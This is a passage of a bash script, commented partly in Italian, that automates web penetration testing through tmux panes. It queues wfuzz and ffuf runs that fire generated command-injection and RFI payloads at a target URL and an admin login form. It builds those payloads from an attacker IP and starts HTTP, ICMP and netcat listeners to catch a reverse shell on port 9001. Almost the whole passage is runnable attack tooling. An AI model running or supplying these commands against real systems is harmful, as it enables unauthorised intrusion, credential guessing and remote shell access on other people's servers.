tmux send-keys -t PT:7.3"# RFI injection automation (GET)" Enter
tmux send-keys -t PT:7.3 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
tmux send-keys -t PT:7.4 "# RFI injection automation (POST)" Enter
tmux send-keys -t PT:7.4 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
cd $folderProject




# WEB SSTI
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:8 -n 'WEB SSTI'
tmux split-window -v -t PT:8.0
tmux resize-pane -t PT:8.0 -y 3
tmux split-window -v -t PT:8.1
tmux select-pane -t "8.1"
tmux split-window -h -t "8.1"
tmux split-window -h -t "8.1"
tmux split-window -v -t PT:8.4
tmux select-pane -t "8.4"
tmux split-window -h -t "8.4"
tmux split-window -h -t "8.4"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:8.0 "# automate command injection scan" Enter
tmux send-keys -t PT:8.0 "sudo uniscan -u $url -qweds"
tmux send-keys -t PT:8.1 "# activate listener ICMP" Enter
tmux send-keys -t PT:8.1 "sudo tcpdump -i tun0 icmp"
tmux send-keys -t PT:8.2 "# activate listener HTTP" Enter
tmux send-keys -t PT:8.2 "python3 -m http.server 80"
tmux send-keys -t PT:8.3 "# activate listener for reverse shell on port 9001" Enter
tmux send-keys -t PT:8.3 "nc -nlvp 9001"
#Preparo il file per le command injection
cd $folderProjectEngine
python ./cmdGenerator.py $attackerIP injection.txt
mv "$folderProjectEngine/out-injection-list.txt" "$folderProjectWebAuthN/out-injection-list.txt"
cd $folderProjectWebAuthN
tmux send-keys -t PT:8.4"# command injection automation (save burp file with name: burp.req)" Enter
tmux send-keys -t PT:8.4 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-injection-list.txt -fl 120"
tmux send-keys -t PT:8.5"# command injection automation (GET)" Enter
tmux send-keys -t PT:8.5 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
tmux send-keys -t PT:8.6 "# command injection automation (POST)" Enter
tmux send-keys -t PT:8.6 "wfuzz -c -z file,out-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"







# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;


        *)
            echo "Scelta non valida. Per favore, scegli un numero da 0 a 6."
            ;;
    esac
done
